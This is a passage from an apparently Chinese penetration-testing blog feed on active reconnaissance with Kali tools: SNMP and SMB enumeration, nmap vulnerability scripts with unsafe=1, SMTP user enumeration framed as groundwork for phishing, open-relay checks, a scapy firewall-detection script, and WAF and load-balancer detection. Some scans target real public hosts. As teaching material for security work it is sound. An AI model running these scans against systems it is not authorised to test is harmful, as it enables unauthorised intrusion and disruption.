100<ul><li><code>-i</code>参数表示添加主机列表，单个主机不需要加<code>-i</code>参数</li></ul></li><li>SNMP基于明文传输，也可使用网络嗅探工具进行嗅探</li></ul></blockquote><h3 id="Onesixtyone"><a href="#Onesixtyone" class="headerlink" title="Onesixtyone"></a>Onesixtyone</h3><ul><li><p>onesixtyone 1.1.1.1 public</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213181231541.png" alt="image-20221213181231541"></li></ul></li><li><p>onesixtyone -c &#x2F;usr&#x2F;share&#x2F;doc&#x2F;onesixtyone&#x2F;dict.txt 192.168.216.157 -o my.log -w 100</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213181806723.png" alt="image-20221213181806723"></li><li>使用字典扫描出目标系统的community为public</li></ul></li></ul><h3 id="Snmpwalk"><a href="#Snmpwalk" class="headerlink" title="Snmpwalk"></a>Snmpwalk</h3><ul><li><p>snmpwalk 192.168.216.157 -c public -v 2c </p><ul><li><p><code>-c</code>参数指定community，<code>-v</code>参数指定SNMP的版本，（SNMP现在有三个版本）</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213182410662.png" alt="image-20221213182410662"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213182700196.png" alt="image-20221213182700196"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213182742720.png" alt="image-20221213182742720"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213182853103.png" alt="image-20221213182853103"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213182955024.png" alt="image-20221213182955024"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213183021288.png" alt="image-20221213183021288"></p></li><li><blockquote><p>前面的数字表示MIB编号，可用于查询MIB库文件；查询出：主机名，MAC地址，IP地址，盘符及序列号，系统进程，系统目录等；（其中IP地址也可查询到与目标主机通信的其他主机IP）</p></blockquote></li></ul></li></ul></li><li><p>nmpwalk -c public -v 2c 192.168.216.157 1.3.6.1.4.1.77.1.2.25</p><ul><li><blockquote><p>查询某个具体的OID信息（OID：1.3.6.1.4.1.77.1.2.25）</p></blockquote><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213183403675.png" alt="image-20221213183403675"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213183531848.png" alt="image-20221213183531848"></p></li><li><blockquote><p>查询出系统的账号信息</p></blockquote></li></ul></li></ul></li></ul><h3 id="Snmp-check"><a href="#Snmp-check" class="headerlink" title="Snmp-check"></a>Snmp-check</h3><blockquote><p><code>-t</code>参数用于探测SNMP</p></blockquote><ul><li><p>snmp-check  1.1.1.1</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213184530831.png" alt="image-20221213184530831"></p></li><li><blockquote><p>相对于snmpwalk，snmp-check的信息更加明确，同样可以检测出：主机名，MAC地址，IP地址，盘符及序列号，系统进程，系统目录等；（其中IP地址也可查询到与目标主机通信的其他主机IP</p></blockquote></li></ul></li><li><p>snmp-check 1.1.1.1 -w</p><ul><li><blockquote><p><code>-w</code>参数检测可写权限</p></blockquote><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213184835812.png" alt="image-20221213184835812"></li></ul></li></ul></li></ul><h2 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h2><blockquote><ul><li><p>Server Message Block 协议</p><ul><li><p>微软历史上出现安全问题最多的协议</p></li><li><p>实现复杂</p></li><li><p>默认开放139，445端口</p></li><li><p>文件共享</p><ul><li>通过SMB协议实现</li></ul></li><li><p>空会话未身份验证访问（SMB1.0版本）</p><ul><li><p>不需要身份验证就可以和目标系统建立空连接</p><ul><li><p>可获取以下信息</p></li><li><p>密码策略</p></li><li><p>‘用户名</p></li><li><p>组名</p></li><li><p>机器名</p></li><li><p>用户、组SID</p></li></ul></li></ul></li></ul></li></ul><p><strong>SMP扫描是针对一个目标机器发现其漏洞。</strong></p></blockquote><h3 id="Nmap-3"><a href="#Nmap-3" class="headerlink" title="Nmap"></a>Nmap</h3><ul><li><p>nmap -v -p139,445 192.168.216.0&#x2F;24</p><ul><li><p><code>-v</code>参数表示显示详细结果和内容</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214103841377.png" alt="image-20221214103841377"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214103825961.png" alt="image-20221214103825961"></p></li><li><blockquote><p>扫描192.168.216.0&#x2F;24这个网段可以扫描出存活主机开放的139和445端口</p></blockquote></li></ul></li><li><p><code>--open</code>参数只查看端口开放的主机</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214104240862.png" alt="image-20221214104240862"></p></li><li><blockquote><p>linux主机安装Samba等服务也会开启139和445端口，单纯扫描出来的结果无法判断是windows还是linux</p></blockquote></li></ul></li></ul></li><li><p>nmap 192.168.216.157 -p139,445 –script&#x3D;smb-os-discovery.nse</p><ul><li>使用nmap脚本扫描139和445端口以及发现OS信息<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214104745200.png" alt="image-20221214104745200"></li></ul></li></ul></li><li><p>nmap -v -p139,445 –script&#x3D;smb-vuln-*.nse –script-args&#x3D;unsafe&#x3D;1 192.168.216.157</p><ul><li><blockquote><p>使用nmap脚本识别开放的端口上是否打了所有的补丁，是否存在漏洞，是否存在未打的补丁；<code>smb-check-vulns</code>脚本检查已知的SMB相关的漏洞，为此脚本中的<code>unsafe</code>参数指定为1：<code>unsafe=1是整个参数</code>赋值给<code>--script-args</code>；<code>unsafe=1</code>是对系统造成破坏的扫描；<code>safe=1</code>是对系统进行非破坏性的扫描。</p></blockquote></li><li><blockquote><p>由于从NMAP 6.49beta6开始，smb-check-vulns.nse脚本被取消了。它被分为smb-vuln-conficker、•smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067这六个脚本。用户根据需要选择对应的脚本。如果不确定执行哪一个，可以使用<code>smb-vuln-*.nse</code>来指定所有的脚本文件，进行全扫描。</p></blockquote></li><li><blockquote><p>smb-vuln-*.nse系列的脚本专门用于检测windows中的SMB服务漏洞，不适用于linux</p></blockquote><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214110549853.png" alt="image-20221214110549853"></p></li><li><blockquote><p>扫描出一个有漏洞的结果，后续可以进行验证再利用</p></blockquote></li></ul></li></ul></li><li><p>nmap -v -p139,445 –script&#x3D;smb-vuln-*.nse –script-args&#x3D;unsafe&#x3D;1 192.168.216.157 -Pn</p><ul><li><blockquote><p><code>-Pn</code>参数目标机开启防火墙也可继续扫描</p></blockquote><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214110920896.png" alt="image-20221214110920896"></li><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214110931361.png" alt="image-20221214110931361"></li></ul></li></ul></li></ul><h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><ul><li><p>nbtscan -r 192.168.216.0&#x2F;24</p><ul><li><p>优点：支持跨网段扫描</p></li><li><p><code>-r</code>参数使用137端口进行扫描，兼容性比较好</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214113046236.png" alt="image-20221214113046236"></li></ul></li></ul></li></ul><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><blockquote><p>在linux上枚举出windows系统，不支持网段扫描</p></blockquote><ul><li><p>enum4linux -a 192.168.216.157</p><ul><li><p>枚举出的信息很全面</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214113555137.png" alt="image-20221214113555137"></p></li><li><blockquote><p>扫描出主机信息以及开启的服务</p></blockquote></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214113721815.png" alt="image-20221214113721815"></p></li><li><blockquote><p>192.168.216.157允许建立空连接</p></blockquote></li></ul></li></ul></li><li><p>enum4linux -a 192.168.216.167</p><ul><li><p>OS信息</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114441141.png" alt="image-20221214114441141"></li></ul></li><li><p>用户信息</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114501583.png" alt="image-20221214114501583"></li><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114520840.png" alt="image-20221214114520840"></li></ul></li><li><p>共享服务</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114558714.png" alt="image-20221214114558714"></li><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114620604.png" alt="image-20221214114620604"></li></ul></li><li><p>密码策略信息</p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114644586.png" alt="image-20221214114644586"></li></ul></li><li><p>主机的SID及用户的RID</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214114746073.png" alt="image-20221214114746073"></p></li><li><blockquote><p>Administrator账号的RID永远都是500，即使修改为其他名字也是500，只要识别出500就是Administrator用户</p></blockquote></li></ul></li></ul></li></ul><h2 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h2><blockquote><p><strong>针对目标系统发现邮件账号信息</strong>，后续进行社工发送钓鱼邮件等等。</p><ul><li>扫描SMTP<ul><li>发现邮件账号</li><li>社会工程学</li><li>钓鱼邮件</li></ul></li></ul></blockquote><h3 id="Nc-1"><a href="#Nc-1" class="headerlink" title="Nc"></a>Nc</h3><ul><li>nc -nv 192.168.216.157 25        # 连接25端口<ul><li>使用<code>VRFY</code>方式尝试<code>root</code>用户连接<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214120503486.png" alt="image-20221214120503486"></li></ul></li></ul></li></ul><h3 id="Nmap-4"><a href="#Nmap-4" class="headerlink" title="Nmap"></a>Nmap</h3><ul><li><p>nmap smtp.163.com -p25 –script&#x3D;smtp-enum-users.nse –script-args&#x3D;smtp-enum-users.methods&#x3D;{VRFY}</p><ul><li><blockquote><p><code>smtp-enum-users.nse</code>枚举用户的脚本，其脚本参数<code>smtp-enum-users.methods</code>指定使用什么方式进行枚举，这里使用的是{VRFY}方式，默认用root账号，也可加别的参数（指定字典）</p></blockquote><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214120048422.png" alt="image-20221214120048422"></li></ul></li></ul></li><li><p>smtp-user-enum -M VRFY -U users.txt -t 192.168.216.167</p><ul><li>使用字典枚举用户<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214120830982.png" alt="image-20221214120830982"></li></ul></li></ul></li></ul><h4 id="邮件开放中继"><a href="#邮件开放中继" class="headerlink" title="邮件开放中继"></a>邮件开放中继</h4><blockquote><p>如果开放了邮件中继，所有人都可以使用该邮件服务器，该邮件服务器就可以被当作肉鸡进行后续工作</p></blockquote><ul><li>nmap smtp.163.com -p25 –script&#x3D;smtp-open-relay.nse<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214121143550.png" alt="image-20221214121143550"></li></ul></li></ul><h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><blockquote><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li><li>设备多种多样，结果存在一定 误差</li><li>被过滤的端口，不是防火墙上的端口，而是内部主机向外发起请求的临时端口</li></ul></blockquote><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/SouthEast.jpeg" alt="img"></p><blockquote><p>第一种情况：先发送一个SYN包，对方没有回应（No），再发一个ACK包，对方回应RST，判断防火墙过滤规则为Filtered；</p><p>第二种情况：先发送一个SYN包，对方回应SYN+ACK或者SYN+RST；再发一个ACK包，对方没有回应，判断防火墙过滤规则为Filtered；</p><p>第三种情况：先发送一个SYN包，对方回应SYN+ACK或者SYN+RST；再发送一个ACK包，对方回应RST包，这种情况有可能没有过滤（Unfiltered&#x2F;Open）；</p><p>第四种情况：先发送一个SYN包，对方没有回应；再发一个ACK，对方还没有回应；这种情况判断为端口是关闭状态，防火墙不允许访问，端口也没有开放。</p></blockquote><h3 id="Python-2"><a href="#Python-2" class="headerlink" title="Python"></a>Python</h3><ul><li><p>使用Python脚本识别防火墙</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214173928736.png" alt="image-20221214173928736"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214181051904.png" alt="image-20221214181051904"></p></li><li><pre><code class="python">#!/usr/bin/pythonfrom scapy.all import*import logginglogging.getLogger( &quot;scapy.runtime&quot; ).setLevel(logging.ERROR)import sysif len( sys.argv ) !=3:   print(&quot;Usage - ./Firewalk_scan.py [Target.IP] [Target Port]&quot;)   print(&quot;Example - ./Firewalk_scan.py 1.1.1.1 443&quot;)   print(&quot;Example will determine if filtering exists on port 443 of Host 1.1.1.1&quot;)   sys.exit()ip = sys.argv[1]port = int(sys.argv[2])ACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags=&quot;A&quot;),timeout=1,verbose=0)SYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags=&quot;S&quot;),timeout=1,verbose=0)if ((ACK_response == None) or (SYN_response == None)):   print(&quot;Port is either unstatefully filtered or host is down&quot;)elif ((int(ACK_response[TCP].flags) == 4) or (SYN_response == None)) and not ((ACK_response == None) and (SYN_response == None)):   print(&quot;Stateful filtering in place&quot;)   elif int(SYN_response[TCP].flags) == 18:   print(&quot;Port is unfiltered and open&quot;)elif int(SYN_response[TCP].flags) == 20:   print(&quot;Port is unfiltered and closed&quot;)else:   print(&quot;Unable to determine if the port is filtered&quot;)</code></pre></li></ul></li></ul><h3 id="Nmap-5"><a href="#Nmap-5" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote><p>通过发送ACK包查看回应包，对应表中4种情况，查看对应的是什么规则</p></blockquote><ul><li>nmap -p22 192.168.216.167 -sA<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214181513482.png" alt="image-20221214181513482"></li></ul></li></ul><h2 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h2><blockquote><ul><li>广域网负载均衡<ul><li>通过DNS轮询，进行负载均衡</li></ul></li><li>服务器负载均衡(HTTP-Loadbalancing)<ul><li>Nginx</li><li>Apache</li></ul></li></ul></blockquote><h2 id="Lbd"><a href="#Lbd" class="headerlink" title="Lbd"></a>Lbd</h2><ul><li><p>lbd <a href="http://www.baidu.com/">www.baidu.com</a></p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214182210888.png" alt="image-20221214182210888"></p></li><li><blockquote><p>存在广域网负载均衡；服务器负载均衡为bfe，BFE为应用层负载均衡引擎</p></blockquote></li></ul></li><li><p>lbd mail.163.com</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214182439272.png" alt="image-20221214182439272"></p></li><li><blockquote><p>服务器负载均衡为nginx；没有检测到广域网负载均衡</p></blockquote></li></ul></li></ul><h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><blockquote><p>WEB应用防火墙</p></blockquote><h3 id="Wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h3><ul><li><p>wafw00f -l</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214182927663.png" alt="image-20221214182927663"></p></li><li><blockquote><p><code>-l</code>参数查看可检测的已知WAF</p></blockquote></li></ul></li><li><p>wafw00f <a href="http://www.baidu.com/">http://www.baidu.com</a></p><ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214183257174.png" alt="image-20221214183257174"></li></ul></li></ul><h3 id="Nmap-6"><a href="#Nmap-6" class="headerlink" title="Nmap"></a>Nmap</h3><ul><li>nmap <a href="http://www.baidu.com/">www.baidu.com</a> –script&#x3D;http-waf-detect.nse<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221214183656827.png" alt="image-20221214183656827"></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-主动信息搜集【端口扫描】</title>
      <link href="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/"/>
      <url>/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="端口扫描—UDP"><a href="#端口扫描—UDP" class="headerlink" title="端口扫描—UDP"></a>端口扫描—UDP</h2><blockquote><p>二三四层发现的目的只是为了准确发现所有活着主机IP，确定攻击面，端口扫描即发现攻击点，发现开放端口。端口对应网络服务及应用端程序，服务端程序的漏洞通过端口攻入。</p></blockquote><ul><li>UDP端口扫描<ul><li>假设ICMP prot-unreachable响应代表端口关闭<ul><li>目标系统不响应ICMP prot-unreachable时，可能产生误判</li></ul></li><li>完整的UDP应用层请求<ul><li>准确性高</li><li>耗时巨大</li></ul></li></ul></li></ul><h3 id="Scapy-UDP-Scan"><a href="#Scapy-UDP-Scan" class="headerlink" title="Scapy UDP Scan"></a>Scapy UDP Scan</h3><p>使用一台靶机用来测试</p><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215403682.png" alt="image-20221211215403682"></p><ul><li><p>端口关闭：ICMP prot-unreachable</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215224441.png" alt="image-20221211215224441"></li></ul></li><li><p>端口开发：没有回包</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215312649.png" alt="image-20221211215312649"></li><li><img 